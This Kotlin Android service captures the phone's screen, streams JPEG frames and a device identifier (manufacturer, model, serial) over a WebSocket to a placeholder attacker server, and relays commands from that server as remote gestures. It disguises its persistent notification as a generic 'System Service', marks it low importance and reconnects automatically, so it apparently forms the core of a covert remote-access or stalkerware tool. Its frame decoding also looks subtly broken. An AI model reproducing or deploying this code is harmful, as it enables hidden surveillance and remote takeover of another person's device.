package com.yourname.screenctrl

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.graphics.Bitmap
import android.graphics.BitmapFactory
import android.graphics.PixelFormat
import android.hardware.display.DisplayManager
import android.hardware.display.VirtualDisplay
import android.media.ImageReader
import android.media.projection.MediaProjection
import android.media.projection.MediaProjectionManager
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.util.Base64
import java.io.ByteArrayOutputStream
import java.net.URI
import org.java_websocket.client.WebSocketClient
import org.java_websocket.handshake.ServerHandshake

class ScreenService : Service() {

    private lateinit var mediaProjection: MediaProjection
    private lateinit var virtualDisplay: VirtualDisplay
    private lateinit var imageReader: ImageReader
    private var webSocket: WebSocketClient? = null
    private var isRunning = true

    override fun onCreate() {
        super.onCreate()
        createNotificationChannel()
        
        val notification = Notification.Builder(this, "screen_channel")
            .setContentTitle("System Service")
            .setContentText("Running...")
            .setSmallIcon(android.R.drawable.ic_menu_camera)
            .setOngoing(true)
            .build()
        
        startForeground(1, notification)
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        val resultCode = intent?.getIntExtra("resultCode", 0) ?: return START_NOT_STICKY
        val data = intent?.getParcelableExtra<Intent>("data") ?: return START_NOT_STICKY

        val prefs = getSharedPreferences("screen_ctrl", MODE_PRIVATE)
        var serverUrl = prefs.getString("server_url", "ws://YOUR_SERVER_IP:8080") ?: "ws://YOUR_SERVER_IP:8080"

        val mpManager = getSystemService(MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
        mediaProjection = mpManager.getMediaProjection(resultCode, data)

        connectWebSocket(serverUrl)
        startCapture()

        return START_STICKY
    }

    private fun connectWebSocket(url: String) {
        try {
            webSocket = object : WebSocketClient(URI(url)) {
                override fun onOpen(handshake: ServerHandshake?) {
                    val deviceId = Build.MANUFACTURER + "_" + Build.MODEL + "_" + Build.SERIAL
                    send("{\"type\":\"register\",\"deviceId\":\"$deviceId\"}")
                }

                override fun onMessage(message: String?) {
                    message?.let { handleRemoteCommand(it) }
                }

                override fun onClose(code: Int, reason: String?, remote: Boolean) {
                    Handler(Looper.getMainLooper()).postDelayed({
                        connectWebSocket(url)
                    }, 5000)
                }

                override fun onError(ex: Exception?) {
                    ex?.printStackTrace()
                }
            }
            webSocket?.connect()
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }

    private fun handleRemoteCommand(json: String) {
        val intent = Intent("REMOTE_GESTURE")
        intent.putExtra("data", json)
        sendBroadcast(intent)
    }

    private fun startCapture() {
        val metrics = resources.displayMetrics
        val width = metrics.widthPixels
        val height = metrics.heightPixels
        val density = metrics.densityDpi

        imageReader = ImageReader.newInstance(width, height, PixelFormat.RGBA_8888, 2)
        
        virtualDisplay = mediaProjection.createVirtualDisplay(
            "ScreenCapture",
            width, height, density,
            DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
            imageReader.surface, null, null
        )

        Thread {
            while (isRunning) {
                try {
                    val image = imageReader.acquireLatestImage()
                    if (image != null) {
                        val buffer = image.planes[0].buffer
                        val bytes = ByteArray(buffer.remaining())
                        buffer.get(bytes)
                        
                        val bitmap = BitmapFactory.decodeByteArray(bytes, 0, bytes.size)
                        val stream = ByteArrayOutputStream()
                        bitmap.compress(Bitmap.CompressFormat.JPEG, 30, stream)
                        val jpegBytes = stream.toByteArray()
                        
                        val base64 = Base64.encodeToString(jpegBytes, Base64.NO_WRAP)
                        webSocket?.send("{\"type\":\"frame\",\"data\":\"$base64\"}")
                        
                        image.close()
                        bitmap.recycle()
                    }
                } catch (e: Exception) {
                    e.printStackTrace()
                }
                Thread.sleep(100)
            }
        }.start()
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                "screen_channel",
                "System Service",
                NotificationManager.IMPORTANCE_LOW
            )
            channel.setShowBadge(false)
            val manager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
            manager.createNotificationChannel(channel)
        }
    }

    override fun onDestroy() {
        isRunning = false
        virtualDisplay?.release()
        mediaProjection?.stop()
        webSocket?.close()
        super.onDestroy()
    }

    override fun onBind(intent: Intent?): IBinder? = null
}
